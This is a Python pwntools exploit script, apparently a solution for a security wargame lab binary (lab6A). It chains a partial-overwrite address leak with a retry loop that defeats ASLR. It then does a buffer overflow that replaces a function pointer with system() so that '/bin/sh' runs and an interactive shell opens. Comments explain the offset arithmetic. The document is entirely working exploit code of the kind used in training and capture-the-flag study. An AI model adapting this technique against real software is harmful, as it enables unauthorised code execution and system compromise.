from pwn import *
# 000009e0 --> 0be2
# system: base - 0x19ce70
# /bin/sh: base - 0x7c5dc
while True:
    p = process("/levels/lab06/lab6A")

    p.recvuntil("Choice: ")
    p.sendline("1")

    p.recvuntil("name:")
    p.send("a"*32)

    p.recvuntil("description:")
    p.send("A"*90+"\xe2\x3b")

    p.recvuntil("Choice: ")
    p.sendline("3")

    try:
        leak = p.recvline()
        base_addr = u32(leak[-5:-1])-0xdd0
        system = base_addr - 0x19ce70
        sh_str = base_addr - 0x7c5dc
        
        log.info("Base addr: {}".format(hex(base_addr)))
        log.info("System addr: {}".format(hex(system)))
        log.info("/bin/sh addr: {}".format(hex(sh_str)))

        p.sendline("1")

        p.recvuntil("name:")
        p.send("/bin/sh"+"\x00"*25)
        
        p.recvuntil("description:")
        p.send("A"*115+p32(system))
        # Here we ended the name with zeroes so that
        # the user->desc + strlen(user->desc) only adds 7
        # strlen("/bin/sh") then it adds the " is a " so
        # that adds another 6 bytes so we simply need to fill
        # 128 - 7 - 6 = 115 and then we can overwrite sfunc
        # with system and since sfunc is called with a pointer
        # to merchant it will be pointing to the firtst string
        # of the struct so name, that's why we put /bin/sh there
        p.recvuntil("Choice: ")
        p.sendline("3")

        p.interactive()

        break
    except  EOFError:
        p.close()
        continue
